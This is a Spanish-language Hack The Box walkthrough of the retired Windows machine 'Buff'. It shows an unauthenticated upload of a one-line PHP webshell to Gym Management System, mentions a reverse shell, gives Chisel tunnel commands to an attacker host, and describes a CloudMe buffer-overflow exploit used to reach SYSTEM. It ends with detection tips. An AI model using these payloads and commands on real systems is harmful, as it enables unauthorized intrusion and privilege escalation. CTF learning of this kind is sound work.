---
machine: Buff
os: Windows
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, web, file-upload, gym-management-system, cloudme, buffer-overflow, chisel]
---

# Buff — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired (ref.), publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Sitio web de gimnasio con **Gym Management System 1.0**, vulnerable a una **subida de ficheros sin autenticación**. Se sube un webshell PHP y se obtiene shell como `shaun`. En localhost corre **CloudMe 1.11.2**, con un desbordamiento de buffer conocido: se reenvía el puerto con **Chisel** y el exploit da SYSTEM.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
7680/tcp  pando-pub?  (Windows Update Delivery)
8080/tcp  http        Apache 2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
```

```bash
curl -s http://<IP>:8080/ | head -50
```

La web es «mrb3n's Bro Hut», un sitio de gimnasio con `packages.php`, `facilities.php` y `upload.php`. El pie o el HTML revelan el CMS: **Gym Management System 1.0**.

## Acceso inicial

El CMS permite subir ficheros sin sesión en el endpoint de subida:

```bash
curl -s -F "file=@shell.php" http://<IP>:8080/upload.php
```

```php
<?php system($_GET['c']); ?>
```

Queda en `/upload/shell.php`:

```bash
curl -s "http://<IP>:8080/upload/shell.php?c=whoami"
# buff\shaun
```

Reverse shell con `powershell` o `nc.exe` desde el propio servidor; se estabiliza y se lee la flag de usuario en `C:\Users\shaun\Desktop\`.

## Enumeración local

```bash
netstat -ano | findstr LISTENING
```

```text
127.0.0.1:8888   CloudMe
```

CloudMe solo escucha en loopback, así que hay que traerlo al atacante. Con Chisel:

```bash
# atacante
./chisel server -p 8000 --reverse

# víctima
.\chisel.exe client <IP_ATACANTE>:8000 R:8888:127.0.0.1:8888
```

## Escalada a SYSTEM

```bash
searchsploit CloudMe 1.11.2
```

El exploit `CloudMe 1.11.2 - Buffer Overflow (ROP)` envía un payload que sobrescribe el SEH y ejecuta `calc`/`cmd`. Se cambia la shellcode por una reverse shell y se lanza contra `127.0.0.1:8888` a través del túnel:

```bash
python3 cloudme_exploit.py
```

CloudMe corre como servicio, así que la shell vuelve como **SYSTEM** y la flag de root está en `C:\Users\Administrator\Desktop\`.

## Lecciones

- Un CMS antiguo con subida sin autenticación es shell directa; el PHP 7.4.6 sobre Apache de Windows no añade protección.
- Los servicios que solo escuchan en loopback no son inalcanzables: con una shell ya se puede hacer port forwarding.
- Software de terceros desactualizado en el escritorio del usuario suele correr como servicio: de usuario a SYSTEM en un paso.
- Detección: POST a `upload.php` con extensión ejecutable, ficheros nuevos en el directorio de subidas y procesos `powershell` hijos de `httpd`.
